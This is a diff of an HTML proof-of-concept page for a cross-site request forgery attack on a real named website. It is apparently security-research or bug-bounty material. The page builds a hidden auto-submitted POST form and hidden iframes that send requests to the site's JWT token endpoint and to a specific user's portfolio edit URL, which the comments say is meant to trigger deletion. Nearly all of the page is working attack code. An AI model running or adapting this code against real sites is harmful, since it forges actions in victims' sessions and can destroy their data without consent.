@@ -1,24 +1,69 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC - GET Trigger</title>
+  <title>CSRF PoC - Sequenced GET with Load Event</title>
 </head>
 <body>
-  <h2>CSRF Proof of Concept (GET Triggered Deletion)</h2>
+  <h2>CSRF PoC - Trigger GET Deletion Sequence</h2>
 
-  <!-- Button to manually trigger the CSRF -->
-  <button onclick="triggerCSRF()">Trigger CSRF</button>
+  <button onclick="triggerFormCSRF()">Send Form-Encoded CSRF</button>
+  <button onclick="triggerIframeCSRF()">Send GET CSRF (Hidden Iframe)</button>
+
+  <pre id="output"></pre>
 
   <script>
-    function triggerCSRF() {
-      // Create a hidden iframe to send the GET request
-      var iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = "https://www.datacamp.com/api/jwt/token"; // <-- vulnerable GET endpoint
-      document.body.appendChild(iframe);
+    function log(msg) {
+      document.getElementById("output").textContent += msg + "\n";
+    }
 
-      alert("CSRF GET Triggered!");
+    // -------------------------------
+    // Form-Encoded CSRF (manual)
+    // -------------------------------
+    function triggerFormCSRF() {
+      log("=== Sending Form-Encoded CSRF ===");
+
+      var f = document.createElement("form");
+      f.method = "POST";
+      f.action = "https://www.datacamp.com/api/jwt/token"; // Step 1: JWT endpoint
+
+      var input = document.createElement("input");
+      input.type = "hidden";
+      input.name = "id";
+      input.value = "123"; // Example payload
+      f.appendChild(input);
+
+      document.body.appendChild(f);
+      f.submit();
+
+      log("Form submitted. If server accepts x-www-form-urlencoded → VULNERABLE.");
+    }
+
+    // -------------------------------
+    // GET CSRF via hidden iframes (sequence with load event)
+    // -------------------------------
+    function triggerIframeCSRF() {
+      log("=== Sending GET CSRF Sequence ===");
+
+      // Step 1: Load JWT
+      var jwtIframe = document.createElement("iframe");
+      jwtIframe.style.display = "none";
+      jwtIframe.src = "https://www.datacamp.com/api/jwt/token";
+
+      // Wait for the JWT iframe to fully load before firing portfolio request
+      jwtIframe.onload = function() {
+        log("JWT GET loaded, now triggering portfolio GET...");
+
+        var csrfIframe = document.createElement("iframe");
+        csrfIframe.style.display = "none";
+        csrfIframe.src = "https://www.datacamp.com/portfolio/noyono010101/edit?tab=work-experience";
+        document.body.appendChild(csrfIframe);
+
+        log("Portfolio GET requested → CSRF triggered if backend allows deletion.");
+      };
+
+      document.body.appendChild(jwtIframe);
+      log("JWT GET requested...");
     }
   </script>
 </body>
